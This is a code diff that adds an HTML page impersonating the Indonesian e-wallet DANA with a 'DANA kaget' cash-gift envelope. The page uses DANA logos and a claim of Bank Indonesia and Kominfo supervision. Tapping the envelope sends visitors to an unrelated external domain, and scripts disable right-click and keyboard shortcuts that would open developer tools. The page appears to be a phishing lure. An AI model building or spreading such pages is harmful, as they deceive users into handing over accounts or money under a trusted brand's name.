@@ -1,0 +1,97 @@
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0">
+<link rel="stylesheet" href="css/ionicons.min.css">
+<link rel="stylesheet" href="css/ionicons.min.css">
+<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
+	<meta name="description" content="">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+	<meta name="theme-color" content="#0f78cb">
+	<meta property="og:type" content="website">
+	<meta http-equiv="Content-Security-Policy" content="default-src * 'self' 'unsafe-inline' 'unsafe-eval' data: gap:">
+	<title>𝗗𝗔𝗡𝗔 𝗞𝗔𝗚𝗘𝗧 𝗛𝗔𝗥𝗜 𝗜𝗡𝗜
+</title><link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkMjeFqvQO9zDmWdmPT5f8tcO47UCiSSNIhOo9U-PLPmEUoCEjBdrEQR40&s=10">
+<link rel="image_src" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkMjeFqvQO9zDmWdmPT5f8tcO47UCiSSNIhOo9U-PLPmEUoCEjBdrEQR40&s=10">
+        <link data-n-head="ssr" rel="icon" type="image/x-icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkMjeFqvQO9zDmWdmPT5f8tcO47UCiSSNIhOo9U-PLPmEUoCEjBdrEQR40&s=10">
+        <link rel="stylesheet" href="css/index.css">
+    </head>
+<body>
+<div class="container_yondahost" style="display:none;">
+
+  <div class="text_amplop">
+    <h4>Tap amplop buat <br> liat DANA kaget</h4>
+  </div>
+  <img onclick="location.href='https://vezo.rnskji.my.id'" src="images/amplop1_1_1.png" alt="" class="amplop">
+  <div class="punyadaget">
+      <img src="images/796a9833-025a-442b-ac85-e7b6dd49c380.jpeg" alt="">
+      <div class="group_text">
+         <h5>Dari</h5>
+         <h3>Dina ðŸŒ·</h3>
+      </div>
+  </div>
+</div>
+
+<div sty="" class="start" style="display:none;">
+      <img class="logo" src="images/logoDana.png">
+        <div class="footimg">
+         <img src="images/bi.png" alt="">
+         <img src="images/kom.png" alt="">
+         <p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
+      </div>
+    </div>
+
+<script src="js/jquery-3.5.1.min.js">
+</script>
+<script src="js/jquery.mask.min.js"></script>
+
+
+<script>
+window.onload = function()
+{
+        setTimeout(function(){
+            $(".start").fadeIn();
+            setTimeout(function(){
+                $(".start").fadeOut(1000);
+                setTimeout(function(){
+                   $(".container_yondahost").fadeIn(200);
+                   $(".container_yondahost").focus();
+                },1000);
+            },2000);
+        },500);
+}
+</script>
+
+<script>
+    var addHandler = function (element, type, handler) {
+	if (element.addEventListener) {
+		element.addEventListener(type, handler, false);
+	} else if (element.attachEvent) {
+		element.attachEvent("on" + type, handler);
+	} else {
+		element["on" + type] = handler;
+	}
+};
+
+var preventDefault = function (event) {
+	if (event.preventDefault) {
+		event.preventDefault();
+	} else {
+		event.returnValue = false;
+	}
+};
+
+addHandler(window, "contextmenu", function (event) {
+	preventDefault(event);
+});
+
+document.onkeydown = function (event) {
+	if(event.ctrlKey || event.shiftKey || event.keyCode == 123) {
+		return false;
+	}
+};
+</script>
+
+
+</body></html>
